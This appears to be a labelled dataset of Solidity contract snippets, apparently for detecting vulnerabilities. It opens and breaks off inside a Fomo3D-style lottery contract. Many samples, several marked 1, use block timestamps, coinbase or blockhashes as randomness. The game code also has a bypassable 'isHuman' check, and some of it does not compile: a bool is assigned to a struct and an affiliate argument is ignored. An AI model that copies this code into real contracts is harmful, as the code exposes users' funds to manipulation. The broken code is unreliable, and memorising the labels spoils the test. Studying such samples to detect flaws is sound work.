_eventData_.newPot = _res;                 rID_++;        _rID++;        round_[_rID].strt = now;        round_[_rID].end = now.add(rndInit_).add(rndGap_);        round_[_rID].pot = _res;        return(_eventData_);    }         function updateGenVault(uint256 _pID, uint256 _rIDlast)        private    {        uint256 _earnings = calcUnMaskedEarnings(_pID, _rIDlast);        if (_earnings > 0)        {                         plyr_[_pID].gen = _earnings.add(plyr_[_pID].gen);                         plyrRnds_[_pID][_rIDlast].mask = _earnings.add(plyrRnds_[_pID][_rIDlast].mask);        }    }         function updateTimer(uint256 _keys, uint256 _rID)        private    {                 uint256 _now = now;                 uint256 _newTime;        if (_now > round_[_rID].end && round_[_rID].plyr == 0)            _newTime = (((_keys) / (1000000000000000000)).mul(rndInc_)).add(_now);        else            _newTime = (((_keys) / (1000000000000000000)).mul(rndInc_)).add(round_[_rID].end);                 if (_newTime < (rndMax_).add(_now))            round_[_rID].end = _newTime;        else            round_[_rID].end = rndMax_.add(_now);    }         function airdrop()        private        view        returns(bool)    {        uint256 seed = uint256(keccak256(abi.encodePacked(            (block.timestamp).add            (block.difficulty).add            ((uint256(keccak256(abi.encodePacked(block.coinbase)))) / (now)).add            (block.gaslimit).add            ((uint256(keccak256(abi.encodePacked(msg.sender)))) / (now)).add            (block.number)        )));        if((seed - ((seed / 1000) * 1000)) < airDropTracker_)            return(true);        else            return(false);    }         function distributeExternal(uint256 _rID, uint256 _pID, uint256 _eth, uint256 _affID, uint256 _team, F3Ddatasets.EventReturns memory _eventData_)        private        returns(F3Ddatasets.EventReturns)    {                 uint256 _p1 = _eth / 100;        uint256 _com = _eth / 50;        _com = _com.add(_p1);        uint256 _p3d = 0;        if (!address(admin1).call.value(_com.sub(_com / 2))())        {                                                                                          _p3d = _p3d.add(_com.sub(_com / 2));        }        if (!address(admin2).call.value(_com / 2)())        {            _p3d = _p3d.add(_com / 2);        }        _com = _com.sub(_p3d);                 uint256 _aff = _eth / 10;                          if (_affID != _pID && plyr_[_affID].name != '') {            plyr_[_affID].aff = _aff.add(plyr_[_affID].aff);            emit F3Devents.onAffiliatePayout(_affID, plyr_[_affID].addr, plyr_[_affID].name, _rID, _pID, _aff, now);        } else {            _p3d = _p3d.add(_aff);        }                 _p3d = _p3d.add((_eth.mul(fees_[_team].p3d)) / (100));        if (_p3d > 0)        {            round_[_rID].pot = round_[_rID].pot.add(_p3d);                         _eventData_.P3DAmount = _p3d.add(_eventData_.P3DAmount);        }        return(_eventData_);    }         function distributeInternal(uint256 _rID, uint256 _pID, uint256 _eth, uint256 _team, uint256 _keys, F3Ddatasets.EventReturns memory _eventData_)        private        returns(F3Ddatasets.EventReturns)    {                 uint256 _gen = (_eth.mul(fees_[_team].gen)) / 100;                 uint256 _air = (_eth / 100);        airDropPot_ = airDropPot_.add(_air);                 _eth = _eth.sub(((_eth.mul(14)) / 100).add((_eth.mul(fees_[_team].p3d)) / 100));                 uint256 _pot = _eth.sub(_gen);                          uint256 _dust = updateMasks(_rID, _pID, _gen, _keys);        if (_dust > 0)            _gen = _gen.sub(_dust);                 round_[_rID].pot = _pot.add(_dust).add(round_[_rID].pot);                 _eventData_.genAmount = _gen.add(_eventData_.genAmount);        _eventData_.potAmount = _pot;        return(_eventData_);    }         function updateMasks(uint256 _rID, uint256 _pID, uint256 _gen, uint256 _keys)        private        returns(uint256)    {                          uint256 _ppt = (_gen.mul(1000000000000000000)) / (round_[_rID].keys);        round_[_rID].mask = _ppt.add(round_[_rID].mask);                          uint256 _pearn = (_ppt.mul(_keys)) / (1000000000000000000);        plyrRnds_[_pID][_rID].mask = (((round_[_rID].mask.mul(_keys)) / (1000000000000000000)).sub(_pearn)).add(plyrRnds_[_pID][_rID].mask);                 return(_gen.sub((_ppt.mul(round_[_rID].keys)) / (1000000000000000000)));    }         function withdrawEarnings(uint256 _pID)        private        returns(uint256)    {                 updateGenVault(_pID, plyr_[_pID].lrnd);                 uint256 _earnings = (plyr_[_pID].win).add(plyr_[_pID].gen).add(plyr_[_pID].aff);        if (_earnings > 0)        {            plyr_[_pID].win = 0;            plyr_[_pID].gen = 0;            plyr_[_pID].aff = 0;        }        return(_earnings);    }         function endTx(uint256 _pID, uint256 _team, uint256 _eth, uint256 _keys, F3Ddatasets.EventReturns memory _eventData_)        private    {        _eventData_.compressedData = _eventData_.compressedData + (now * 1000000000000000000) + (_team * 100000000000000000000000000000);        _eventData_.compressedIDs = _eventData_.compressedIDs + _pID + (rID_ * 10000000000000000000000000000000000000000000000000000);        emit F3Devents.onEndTx        (            _eventData_.compressedData,            _eventData_.compressedIDs,            plyr_[_pID].name,            msg.sender,            _eth,            _keys,            _eventData_.winnerAddr,            _eventData_.winnerName,            _eventData_.amountWon,            _eventData_.newPot,            _eventData_.P3DAmount,            _eventData_.genAmount,            _eventData_.potAmount,            airDropPot_        );    }             bool public activated_ = false;    function activate()        public    {                 require(msg.sender == admin2, "only admin can activate");                 require(activated_ == false, "already activated");                 activated_ = true;                 rID_ = 1;            round_[1].strt = now + rndExtra_ - rndGap_;            round_[1].end = now + rndInit_ + rndExtra_;    }}    library F3Ddatasets {                                                                                                                                                               struct EventReturns {        uint256 compressedData;        uint256 compressedIDs;        address winnerAddr;                  bytes32 winnerName;                  uint256 amountWon;                   uint256 newPot;                      uint256 P3DAmount;                   uint256 genAmount;                   uint256 potAmount;               }    struct Player {        address addr;            bytes32 name;            uint256 win;             uint256 gen;             uint256 aff;             uint256 lrnd;            uint256 laff;        }    struct PlayerRounds {        uint256 eth;             uint256 keys;            uint256 mask;            uint256 ico;         }    struct Round {        uint256 plyr;            uint256 team;            uint256 end;             bool ended;              uint256 strt;            uint256 keys;            uint256 eth;             uint256 pot;             uint256 mask;            uint256 ico;             uint256 icoGen;          uint256 icoAvg;      }    struct TeamFee {        uint256 gen;             uint256 p3d;         }    struct PotSplit {        uint256 gen;             uint256 p3d;         }}    library F3DKeysCalcShort {    using SafeMath for *;         function keysRec(uint256 _curEth, uint256 _newEth)        internal        pure        returns (uint256)    {        return(keys((_curEth).add(_newEth)).sub(keys(_curEth)));    }         function ethRec(uint256 _curKeys, uint256 _sellKeys)        internal        pure        returns (uint256)    {        return((eth(_curKeys)).sub(eth(_curKeys.sub(_sellKeys))));    }         function keys(uint256 _eth)        internal        pure        returns(uint256)    {        return ((((((_eth).mul(1000000000000000000)).mul(312500000000000000000000000)).add(5624988281256103515625000000000000000000000000000000000000000000)).sqrt()).sub(74999921875000000000000000000000)) / (156250000);    }         function eth(uint256 _keys)        internal        pure        returns(uint256)    {        return ((78125000).mul(_keys.sq()).add(((149999843750000).mul(_keys.mul(1000000000000000000))) / (2))) / ((1000000000000000000).sq());    }}    interface PlayerBookInterface {    function getPlayerID(address _addr) external returns (uint256);    function getPlayerName(uint256 _pID) external view returns (bytes32);    function getPlayerLAff(uint256 _pID) external view returns (uint256);    function getPlayerAddr(uint256 _pID) external view returns (address);    function getNameFee() external view returns (uint256);    function registerNameXIDFromDapp(address _addr, bytes32 _name, uint256 _affCode, bool _all) external payable returns(bool, uint256);    function registerNameXaddrFromDapp(address _addr, bytes32 _name, address _affCode, bool _all) external payable returns(bool, uint256);    function registerNameXnameFromDapp(address _addr, bytes32 _name, bytes32 _affCode, bool _all) external payable returns(bool, uint256);} library NameFilter {         function nameFilter(string _input)        internal        pure        returns(bytes32)    {        bytes memory _temp = bytes(_input);        uint256 _length = _temp.length;                 require (_length <= 32 && _length > 0, "string must be between 1 and 32 characters");                 require(_temp[0] != 0x20 && _temp[_length-1] != 0x20, "string cannot start or end with space");                 if (_temp[0] == 0x30)        {            require(_temp[1] != 0x78, "string cannot start with 0x");            require(_temp[1] != 0x58, "string cannot start with 0X");        }                 bool _hasNonNumber;                 for (uint256 i = 0; i < _length; i++)        {                         if (_temp[i] > 0x40 && _temp[i] < 0x5b)            {                                 _temp[i] = byte(uint(_temp[i]) + 32);                                 if (_hasNonNumber == false)                    _hasNonNumber = true;            } else {                require                (                                         _temp[i] == 0x20 ||                                         (_temp[i] > 0x60 && _temp[i] < 0x7b) ||                                         (_temp[i] > 0x2f && _temp[i] < 0x3a),                    "string contains invalid characters"                );                                 if (_temp[i] == 0x20)                    require( _temp[i+1] != 0x20, "string cannot contain consecutive spaces");                                 if (_hasNonNumber == false && (_temp[i] < 0x30 || _temp[i] > 0x39))                    _hasNonNumber = true;            }        }        require(_hasNonNumber == true, "string cannot be only numbers");        bytes32 _ret;        assembly {            _ret := mload(add(_temp, 32))        }        return (_ret);    }} library SafeMath {         function mul(uint256 a, uint256 b)        internal        pure        returns (uint256 c)    {        if (a == 0) {            return 0;        }        c = a * b;        require(c / a == b, "SafeMath mul failed");        return c;    }         function sub(uint256 a, uint256 b)        internal        pure        returns (uint256)    {        require(b <= a, "SafeMath sub failed");        return a - b;    }         function add(uint256 a, uint256 b)        internal        pure        returns (uint256 c)    {        c = a + b;        require(c >= a, "SafeMath add failed");        return c;    }         function sqrt(uint256 x)        internal        pure        returns (uint256 y)    {        uint256 z = ((add(x,1)) / 2);        y = x;        while (z < y)        {            y = z;            z = ((add((x / z),z)) / 2);        }    }         function sq(uint256 x)        internal        pure        returns (uint256)    {        return (mul(x,x));    }         function pwr(uint256 x, uint256 y)        internal        pure        returns (uint256)    {        if (x==0)            return (0);        else if (y==0)            return (1);        else        {            uint256 z = x;            for (uint256 i=1; i < y; i++)                z = mul(z,x);            return (z);        }    }}
1<CODESPLIT>contract DaddyToken{    uint256 public totalBonusTokensIssued = 0;    function() payable public {        bytes20 bonusHash = ripemd160(block.coinbase, block.number, block.timestamp);        if (bonusHash[0] == 0) {            uint8 bonusMultiplier = ((bonusHash[1] & 0x01 != 0) ? 1 : 0);            uint256 bonusTokensIssued = (msg.value * 100) * bonusMultiplier;            totalBonusTokensIssued += bonusTokensIssued;        }    }}
0<CODESPLIT>contract IssuerContract {  using AddressExtension for address;  event SetIssuer(address indexed _address);  modifier onlyIssuer {    require(issuer == msg.sender);    _;  }  address public issuer;  address public newIssuer;  constructor(address _issuer) internal {    issuer = _issuer;  }  function setIssuer(address _address) public onlyIssuer {    newIssuer = _address;  }  function confirmSetIssuer() public {    require(newIssuer == msg.sender);    emit SetIssuer(issuer = newIssuer);    delete newIssuer;  }}
0<CODESPLIT>contract SmartToken is Authorizable, IssuerContract, ERC20Like {  string public name;  string public symbol;  uint256 public totalSupply;  uint8 public constant decimals = 18;  constructor(    address _issuer,    FsTKAuthority _fstkAuthority,    string _name,    string _symbol,    uint256 _totalSupply,    string _metadata  )    Authorizable(_fstkAuthority)    IssuerContract(_issuer)    ERC20Like(_metadata)    public  {    name = _name;    symbol = _symbol;    totalSupply = _totalSupply;    accounts[_issuer].balance = _totalSupply;    emit Transfer(address(0), _issuer, _totalSupply);  }  function setERC20ApproveChecking(bool approveChecking) public onlyIssuer {    super.setERC20ApproveChecking(approveChecking);  }  function setDelegate(bool delegate) public onlyIssuer {    super.setDelegate(delegate);  }  function setDirectDebit(bool directDebit) public onlyIssuer {    super.setDirectDebit(directDebit);  }  function setMetadata(    string infoUrl,    uint256 approveTime,    bytes approveToken  )    public    onlyIssuer    onlyFsTKApproved(keccak256(abi.encodePacked(approveTime, this, msg.sig, infoUrl)), approveTime, approveToken)  {    setMetadata0(infoUrl);  }  function setLiquid(    bool liquidity,    uint256 approveTime,    bytes approveToken  )    public    onlyIssuer    onlyFsTKApproved(keccak256(abi.encodePacked(approveTime, this, msg.sig, liquidity)), approveTime, approveToken)  {    setLiquid0(liquidity);  }}
1<CODESPLIT>contract W4T {    uint public miningReward = 1000000000000000000;    uint private randomNumber;    mapping (address => uint256) public balanceOf;    uint balanceRel = 100;    function () external payable {        randomNumber += block.timestamp;        uint minedAtBlock = uint(block.blockhash(block.number - 1));        uint minedHashRel = uint(sha256(minedAtBlock + randomNumber + uint(msg.sender))) % 100000;        if (minedHashRel < balanceRel) {            uint reward = miningReward + minedHashRel * 100000000000000;            balanceOf[msg.sender] += reward;        }    }}
1<CODESPLIT>contract NGOTVesting {    uint256 public lockStartTime;    mapping(address => uint256) public stageSettings;    function vestStage() public view returns(uint256){        uint256 stage = block.timestamp - lockStartTime;        if(stage > stageSettings[msg.sender]){            stage = stageSettings[msg.sender];        }        return stage;    }}
1<CODESPLIT>contract FrozenGuard {    bool public stopped;    function onTokenTransfer() public returns (bool) {        if (!stopped && block.timestamp >= 1524801600) {            return false;        }        return true;    }}
0<CODESPLIT>contract Recoverable is Ownable {     function Recoverable() {  }        function recoverTokens(ERC20Basic token) onlyOwner public {    token.transfer(owner, tokensToBeReturned(token));  }           function tokensToBeReturned(ERC20Basic token) public returns (uint) {    return token.balanceOf(this);  }}
0<CODESPLIT>contract Whitelist is Ownable {  mapping(address => bool) public whitelist;    event WhitelistedAddressAdded(address addr);  event WhitelistedAddressRemoved(address addr);     modifier onlyWhitelisted() {    require(whitelist[msg.sender]);    _;  }     function addAddressToWhitelist(address addr) onlyOwner public returns(bool success) {    if (!whitelist[addr]) {      whitelist[addr] = true;      WhitelistedAddressAdded(addr);      success = true;     }  }     function addAddressesToWhitelist(address[] addrs) onlyOwner public returns(bool success) {    for (uint256 i = 0; i < addrs.length; i++) {      if (addAddressToWhitelist(addrs[i])) {        success = true;      }    }  }     function removeAddressFromWhitelist(address addr) onlyOwner public returns(bool success) {    if (whitelist[addr]) {      whitelist[addr] = false;      WhitelistedAddressRemoved(addr);      success = true;    }  }     function removeAddressesFromWhitelist(address[] addrs) onlyOwner public returns(bool success) {    for (uint256 i = 0; i < addrs.length; i++) {      if (removeAddressFromWhitelist(addrs[i])) {        success = true;      }    }  }}
0<CODESPLIT>contract FractionalERC20 is ERC20 {  uint public decimals;}library SafeMath {     function mul(uint256 a, uint256 b) internal pure returns (uint256) {    if (a == 0) {      return 0;    }    uint256 c = a * b;    assert(c / a == b);    return c;  }     function div(uint256 a, uint256 b) internal pure returns (uint256) {         uint256 c = a / b;         return c;  }     function sub(uint256 a, uint256 b) internal pure returns (uint256) {    assert(b <= a);    return a - b;  }     function add(uint256 a, uint256 b) internal pure returns (uint256) {    uint256 c = a + b;    assert(c >= a);    return c;  }}
0<CODESPLIT>contract MintedTokenCappedCrowdsale is Crowdsale {     uint public maximumSellableTokens;  function MintedTokenCappedCrowdsale(address _token, PricingStrategy _pricingStrategy, address _multisigWallet, uint _start, uint _end, uint _minimumFundingGoal, uint _maximumSellableTokens) Crowdsale(_token, _pricingStrategy, _multisigWallet, _start, _end, _minimumFundingGoal) {    maximumSellableTokens = _maximumSellableTokens;  }     function isBreakingCap(uint weiAmount, uint tokenAmount, uint weiRaisedTotal, uint tokensSoldTotal) constant returns (bool limitBroken) {    return tokensSoldTotal > maximumSellableTokens;  }  function isCrowdsaleFull() public constant returns (bool) {    return tokensSold >= maximumSellableTokens;  }     function assignTokens(address receiver, uint tokenAmount) internal {    MintableToken mintableToken = MintableToken(token);    mintableToken.mint(receiver, tokenAmount);  }}
0<CODESPLIT>contract ERC827 is ERC20 {  function approve( address _spender, uint256 _value, bytes _data ) public returns (bool);  function transfer( address _to, uint256 _value, bytes _data ) public returns (bool);  function transferFrom( address _from, address _to, uint256 _value, bytes _data ) public returns (bool);}
0<CODESPLIT>contract ERC827Token is ERC827, StandardToken {     function approve(address _spender, uint256 _value, bytes _data) public returns (bool) {    require(_spender != address(this));    super.approve(_spender, _value);    require(_spender.call(_data));    return true;  }     function transfer(address _to, uint256 _value, bytes _data) public returns (bool) {    require(_to != address(this));    super.transfer(_to, _value);    require(_to.call(_data));    return true;  }     function transferFrom(address _from, address _to, uint256 _value, bytes _data) public returns (bool) {    require(_to != address(this));    super.transferFrom(_from, _to, _value);    require(_to.call(_data));    return true;  }     function increaseApproval(address _spender, uint _addedValue, bytes _data) public returns (bool) {    require(_spender != address(this));    super.increaseApproval(_spender, _addedValue);    require(_spender.call(_data));    return true;  }     function decreaseApproval(address _spender, uint _subtractedValue, bytes _data) public returns (bool) {    require(_spender != address(this));    super.decreaseApproval(_spender, _subtractedValue);    require(_spender.call(_data));    return true;  }}
0<CODESPLIT>contract StandardTokenExt is StandardToken, ERC827Token, Recoverable {     function isToken() public constant returns (bool weAre) {    return true;  }}
1<CODESPLIT>contract CrowdsaleBase is Haltable, Whitelist {     uint public MAX_INVESTMENTS_BEFORE_MULTISIG_CHANGE = 5;  using SafeMathLib for uint;     FractionalERC20 public token;     PricingStrategy public pricingStrategy;     FinalizeAgent public finalizeAgent;     address public multisigWallet;     uint public minimumFundingGoal;     uint public startsAt;     uint public endsAt;     uint public tokensSold = 0;     uint public weiRaised = 0;     uint public presaleWeiRaised = 0;     uint public investorCount = 0;     uint public loadedRefund = 0;     uint public weiRefunded = 0;     bool public finalized;     mapping (address => uint256) public investedAmountOf;     mapping (address => uint256) public tokenAmountOf;     mapping (address => bool) public earlyParticipantWhitelist;     uint public ownerTestValue;     enum State{Unknown, Preparing, PreFunding, Funding, Success, Failure, Finalized, Refunding}     event Invested(address investor, uint weiAmount, uint tokenAmount, uint128 customerId);     event Refund(address investor, uint weiAmount);     event InvestmentPolicyChanged(bool newRequireCustomerId, bool newRequiredSignedAddress, address newSignerAddress);     event Whitelisted(address addr, bool status);     event EndsAtChanged(uint newEndsAt);  function CrowdsaleBase(address _token, PricingStrategy _pricingStrategy, address _multisigWallet, uint _start, uint _end, uint _minimumFundingGoal) {    owner = msg.sender;    token = FractionalERC20(_token);    setPricingStrategy(_pricingStrategy);    multisigWallet = _multisigWallet;    if(multisigWallet == 0) {        throw;    }    if(_start == 0) {        throw;    }    startsAt = _start;    if(_end == 0) {        throw;    }    endsAt = _end;         if(startsAt >= endsAt) {        throw;    }         minimumFundingGoal = _minimumFundingGoal;  }        function investInternal(address receiver, uint128 customerId) stopInEmergency internal returns(uint tokensBought) {     	 	              Whitelist dc;    address contract_addr = 0x062e41d1037745dc203e8c1AAcA651B8d157Da96;    dc = Whitelist(contract_addr);    require (dc.whitelist(msg.sender));    require (dc.whitelist(receiver));                 if(getState() == State.PreFunding) {             if(!earlyParticipantWhitelist[receiver]) {        throw;      }    } else if(getState() == State.Funding) {                  } else {             throw;    }    uint weiAmount = msg.value;    require(weiAmount >= minimumFundingGoal);             uint tokenAmount = pricingStrategy.calculatePrice(weiAmount, weiRaised - presaleWeiRaised, tokensSold, msg.sender, token.decimals());         require(tokenAmount != 0);    if(investedAmountOf[receiver] == 0) {               investorCount++;    }         investedAmountOf[receiver] = investedAmountOf[receiver].plus(weiAmount);    tokenAmountOf[receiver] = tokenAmountOf[receiver].plus(tokenAmount);         weiRaised = weiRaised.plus(weiAmount);    tokensSold = tokensSold.plus(tokenAmount);    if(pricingStrategy.isPresalePurchase(receiver)) {        presaleWeiRaised = presaleWeiRaised.plus(weiAmount);    }         require(!isBreakingCap(weiAmount, tokenAmount, weiRaised, tokensSold));    assignTokens(receiver, tokenAmount);         if(!multisigWallet.send(weiAmount)) throw;         Invested(receiver, weiAmount, tokenAmount, customerId);    return tokenAmount;  }     function finalize() public inState(State.Success) onlyOwner stopInEmergency {         if(finalized) {      throw;    }         if(address(finalizeAgent) != 0) {      finalizeAgent.finalizeCrowdsale();    }    finalized = true;  }     function setFinalizeAgent(FinalizeAgent addr) onlyOwner {    finalizeAgent = addr;         if(!finalizeAgent.isFinalizeAgent()) {      throw;    }  }     function setEndsAt(uint time) onlyOwner {    if(now > time) {      throw;      }    if(startsAt > time) {      throw;      }    endsAt = time;    EndsAtChanged(endsAt);  }     function setPricingStrategy(PricingStrategy _pricingStrategy) onlyOwner {    pricingStrategy = _pricingStrategy;         if(!pricingStrategy.isPricingStrategy()) {      throw;    }  }     function setMultisig(address addr) public onlyOwner {         if(investorCount > MAX_INVESTMENTS_BEFORE_MULTISIG_CHANGE) {      throw;    }    multisigWallet = addr;  }     function loadRefund() public payable inState(State.Failure) {    if(msg.value == 0) throw;    loadedRefund = loadedRefund.plus(msg.value);  }     function refund() public inState(State.Refunding) {    uint256 weiValue = investedAmountOf[msg.sender];    if (weiValue == 0) throw;    investedAmountOf[msg.sender] = 0;    weiRefunded = weiRefunded.plus(weiValue);    Refund(msg.sender, weiValue);    if (!msg.sender.send(weiValue)) throw;  }     function isMinimumGoalReached() public constant returns (bool reached) {    return weiRaised >= minimumFundingGoal;  }     function isFinalizerSane() public constant returns (bool sane) {    return finalizeAgent.isSane();  }     function isPricingSane() public constant returns (bool sane) {    return pricingStrategy.isSane(address(this));  }     function getState() public constant returns (State) {    if(finalized) return State.Finalized;    else if (address(finalizeAgent) == 0) return State.Preparing;    else if (!finalizeAgent.isSane()) return State.Preparing;    else if (!pricingStrategy.isSane(address(this))) return State.Preparing;    else if (block.timestamp < startsAt) return State.PreFunding;    else if (block.timestamp <= endsAt && !isCrowdsaleFull()) return State.Funding;    else if (isMinimumGoalReached()) return State.Success;    else if (!isMinimumGoalReached() && weiRaised > 0 && loadedRefund >= weiRaised) return State.Refunding;    else return State.Failure;  }     function setOwnerTestValue(uint val) onlyOwner {    ownerTestValue = val;  }     function setEarlyParicipantWhitelist(address addr, bool status) onlyOwner {    earlyParticipantWhitelist[addr] = status;    Whitelisted(addr, status);  }     function isCrowdsale() public constant returns (bool) {    return true;  }              modifier inState(State state) {    if(getState() != state) throw;    _;  }              function isBreakingCap(uint weiAmount, uint tokenAmount, uint weiRaisedTotal, uint tokensSoldTotal) constant returns (bool limitBroken);     function isCrowdsaleFull() public constant returns (bool);     function assignTokens(address receiver, uint tokenAmount) internal;}
1<CODESPLIT>contract ArenaPool {    function sendArena() external returns (uint64){        uint64 nextArenaTime;        uint64 tmNow = uint64(block.timestamp);        nextArenaTime = tmNow + 21600;        return nextArenaTime;    }}
0<CODESPLIT>contract FOMO3TEST1 is modularShort {    using SafeMath for *;    using NameFilter for string;    using F3DKeysCalcShort for uint256;        address private admin = msg.sender;    string constant public name = "FOMO3TEST1";    string constant public symbol = "FOMO3TEST1";    uint256 private rndExtra_ = 0;          uint256 private rndGap_ = 2 minutes;              uint256 constant private rndInit_ = 60 minutes;                     uint256 constant private rndInc_ = 60 seconds;                   uint256 constant private rndMax_ = 480 minutes;                         uint256 public airDropPot_;                  uint256 public airDropTracker_ = 0;          uint256 public rID_;            mapping (address => uint256) public pIDxAddr_;               mapping (uint256 => F3Ddatasets.Player) public plyr_;        mapping (uint256 => mapping (uint256 => F3Ddatasets.PlayerRounds)) public plyrRnds_;            mapping (uint256 => F3Ddatasets.Round) public round_;        mapping (uint256 => mapping(uint256 => uint256)) public rndTmEth_;              mapping (uint256 => F3Ddatasets.TeamFee) public fees_;               mapping (uint256 => F3Ddatasets.PotSplit) public potSplit_;              uint256 public pID_;                 function determinePID(address _addr)        private        returns (bool)    {        if (pIDxAddr_[_addr] == 0)        {            pID_++;            pIDxAddr_[_addr] = pID_;            plyr_[pID_].addr = _addr;                                     return (true);        } else {            return (false);        }    }      function getPlayerID(address _addr)                private        returns (uint256)    {        determinePID(_addr);        return (pIDxAddr_[_addr]);    }      function getPlayerAddr(uint256 _pID)        private        returns (address)    {        return (plyr_[_pID].addr);    }        constructor()        public    {		                                     		                               fees_[0] = F3Ddatasets.TeamFee(36,0);            fees_[1] = F3Ddatasets.TeamFee(43,0);            fees_[2] = F3Ddatasets.TeamFee(66,0);           fees_[3] = F3Ddatasets.TeamFee(51,0);                              potSplit_[0] = F3Ddatasets.PotSplit(25,0);           potSplit_[1] = F3Ddatasets.PotSplit(25,0);            potSplit_[2] = F3Ddatasets.PotSplit(40,0);           potSplit_[3] = F3Ddatasets.PotSplit(40,0);   	}             modifier isActivated() {        require(activated_ == true, "its not ready yet.  check ?eta in discord");        _;    }         modifier isHuman() {        address _addr = msg.sender;        uint256 _codeLength;        assembly {_codeLength := extcodesize(_addr)}        require(_codeLength == 0, "sorry humans only");        _;    }         modifier isWithinLimits(uint256 _eth) {        require(_eth >= 1000000000, "pocket lint: not a valid currency");        require(_eth <= 100000000000000000000000, "no vitalik, no");        _;    }             function()        isActivated()        isHuman()        isWithinLimits(msg.value)        public        payable    {                 F3Ddatasets.EventReturns memory _eventData_ = determinePID(_eventData_);                 uint256 _pID = pIDxAddr_[msg.sender];                 buyCore(_pID, plyr_[_pID].laff, 2, _eventData_);    }         function buyXid(uint256 _affCode, uint256 _team)        isActivated()        isHuman()        isWithinLimits(msg.value)        public        payable    {                 F3Ddatasets.EventReturns memory _eventData_ = determinePID(_eventData_);                 uint256 _pID = pIDxAddr_[msg.sender];                 _team = verifyTeam(_team);                 buyCore(_pID, _affCode, _team, _eventData_);    }    function buyXaddr(address _affCode, uint256 _team)        isActivated()        isHuman()        isWithinLimits(msg.value)        public        payable    {                 F3Ddatasets.EventReturns memory _eventData_ = determinePID(_eventData_);                 uint256 _pID = pIDxAddr_[msg.sender];                 uint256 _affID = 0;                 _team = verifyTeam(_team);                 buyCore(_pID, _affID, _team, _eventData_);    }         function reLoadXid(uint256 _affCode, uint256 _team, uint256 _eth)        isActivated()        isHuman()        isWithinLimits(_eth)        public    {                 F3Ddatasets.EventReturns memory _eventData_;                 uint256 _pID = pIDxAddr_[msg.sender];                 _team = verifyTeam(_team);                 reLoadCore(_pID, _affCode, _team, _eth, _eventData_);    }    function reLoadXaddr(address _affCode, uint256 _team, uint256 _eth)        isActivated()        isHuman()        isWithinLimits(_eth)        public    {                 F3Ddatasets.EventReturns memory _eventData_;                 uint256 _pID = pIDxAddr_[msg.sender];                 uint256 _affID = 0 ;                 _team = verifyTeam(_team);                 reLoadCore(_pID, _affID, _team, _eth, _eventData_);    }    function reLoadXname(bytes32 _affCode, uint256 _team, uint256 _eth)        isActivated()        isHuman()        isWithinLimits(_eth)        public    {                 F3Ddatasets.EventReturns memory _eventData_;                 uint256 _pID = pIDxAddr_[msg.sender];                 uint256 _affID = 0;                 _team = verifyTeam(_team);                 reLoadCore(_pID, _affID, _team, _eth, _eventData_);    }         function withdraw()        isActivated()        isHuman()        public    {                 uint256 _rID = rID_;                 uint256 _now = now;                 uint256 _pID = pIDxAddr_[msg.sender];                 uint256 _eth;                 if (_now > round_[_rID].end && round_[_rID].ended == false && round_[_rID].plyr != 0)        {                         F3Ddatasets.EventReturns memory _eventData_;             			round_[_rID].ended = true;            _eventData_ = endRound(_eventData_);			             _eth = withdrawEarnings(_pID);                         if (_eth > 0)                plyr_[_pID].addr.transfer(_eth);                         _eventData_.compressedData = _eventData_.compressedData + (_now * 1000000000000000000);            _eventData_.compressedIDs = _eventData_.compressedIDs + _pID;                         emit F3Devents.onWithdrawAndDistribute            (                msg.sender,                plyr_[_pID].name,                _eth,                _eventData_.compressedData,                _eventData_.compressedIDs,                _eventData_.winnerAddr,                _eventData_.winnerName,                _eventData_.amountWon,                _eventData_.newPot,                _eventData_.P3DAmount,                _eventData_.genAmount            );                 } else {                         _eth = withdrawEarnings(_pID);                         if (_eth > 0)                plyr_[_pID].addr.transfer(_eth);                         emit F3Devents.onWithdraw(_pID, msg.sender, plyr_[_pID].name, _eth, _now);        }    }             function getBuyPrice()        public        view        returns(uint256)    {                 uint256 _rID = rID_;                 uint256 _now = now;                 if (_now > round_[_rID].strt + rndGap_ && (_now <= round_[_rID].end || (_now > round_[_rID].end && round_[_rID].plyr == 0)))            return ( (round_[_rID].keys.add(1000000000000000000)).ethRec(1000000000000000000) );        else              return ( 75000000000000 );      }         function getTimeLeft()        public        view        returns(uint256)    {                 uint256 _rID = rID_;                 uint256 _now = now;        if (_now < round_[_rID].end)            if (_now > round_[_rID].strt + rndGap_)                return( (round_[_rID].end).sub(_now) );            else                return( (round_[_rID].strt + rndGap_).sub(_now) );        else            return(0);    }         function getPlayerVaults(uint256 _pID)        public        view        returns(uint256 ,uint256, uint256)    {                 uint256 _rID = rID_;                 if (now > round_[_rID].end && round_[_rID].ended == false && round_[_rID].plyr != 0)        {                         if (round_[_rID].plyr == _pID)            {                return                (                    (plyr_[_pID].win).add( ((round_[_rID].pot).mul(48)) / 100 ),                    (plyr_[_pID].gen).add(  getPlayerVaultsHelper(_pID, _rID).sub(plyrRnds_[_pID][_rID].mask)   ),                    plyr_[_pID].aff                );                         } else {                return                (                    plyr_[_pID].win,                    (plyr_[_pID].gen).add(  getPlayerVaultsHelper(_pID, _rID).sub(plyrRnds_[_pID][_rID].mask)  ),                    plyr_[_pID].aff                );            }                 } else {            return            (                plyr_[_pID].win,                (plyr_[_pID].gen).add(calcUnMaskedEarnings(_pID, plyr_[_pID].lrnd)),                plyr_[_pID].aff            );        }    }         function getPlayerVaultsHelper(uint256 _pID, uint256 _rID)        private        view        returns(uint256)    {        return(  ((((round_[_rID].mask).add(((((round_[_rID].pot).mul(potSplit_[round_[_rID].team].gen)) / 100).mul(1000000000000000000)) / (round_[_rID].keys))).mul(plyrRnds_[_pID][_rID].keys)) / 1000000000000000000)  );    }         function getCurrentRoundInfo()        public        view        returns(uint256, uint256, uint256, uint256, uint256, uint256, uint256, address, bytes32, uint256, uint256, uint256, uint256, uint256)    {                 uint256 _rID = rID_;        return        (            round_[_rID].ico,                            _rID,                                        round_[_rID].keys,                           round_[_rID].end,                            round_[_rID].strt,                           round_[_rID].pot,                            (round_[_rID].team + (round_[_rID].plyr * 10)),                  plyr_[round_[_rID].plyr].addr,               plyr_[round_[_rID].plyr].name,               rndTmEth_[_rID][0],                          rndTmEth_[_rID][1],                          rndTmEth_[_rID][2],                          rndTmEth_[_rID][3],                          airDropTracker_ + (airDropPot_ * 1000)                       );    }         function getPlayerInfoByAddress(address _addr)        public        view        returns(uint256, bytes32, uint256, uint256, uint256, uint256, uint256)    {                 uint256 _rID = rID_;        if (_addr == address(0))        {            _addr == msg.sender;        }        uint256 _pID = pIDxAddr_[_addr];        return        (            _pID,                                            plyr_[_pID].name,                                plyrRnds_[_pID][_rID].keys,                      plyr_[_pID].win,                                 